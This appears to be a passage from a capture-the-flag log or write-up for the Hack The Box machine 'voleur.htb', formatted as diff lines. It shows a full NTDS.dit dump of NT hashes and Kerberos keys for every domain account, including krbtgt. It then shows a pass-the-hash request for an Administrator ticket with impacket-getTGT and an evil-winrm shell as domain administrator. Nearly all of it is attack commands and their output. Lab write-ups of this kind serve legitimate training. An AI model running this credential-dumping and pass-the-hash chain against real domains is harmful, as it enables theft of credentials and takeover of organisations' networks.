+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
+voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
+voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
+voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
+voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
+voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
+voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
+voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
+voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
+[*] Kerberos keys from ntds.dit 
+Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
+Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
+Administrator:des-cbc-md5:459d836b9edcd6b0
+DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
+DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
+DC$:des-cbc-md5:64e05b6d1abff1c8
+krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
+krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
+krbtgt:des-cbc-md5:34ae31d073f86d20
+voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
+voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
+voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
+voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
+voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
+voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
+voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
+voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
+voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
+voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
+voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
+voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
+voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
+voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
+voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
+voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
+voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
+voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
+voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
+voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
+voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
+voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
+voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
+voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
+[*] Cleaning up... 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT voleur.htb/administrator -hashes :e656e07c56d831611b577b160b259ad2
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in administrator.ccache
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# export KRB5CCNAME=/home/kali/administrator.ccache 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i dc.voleur.htb -r voleur.htb        
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoaMI
+voleur\administrator
+
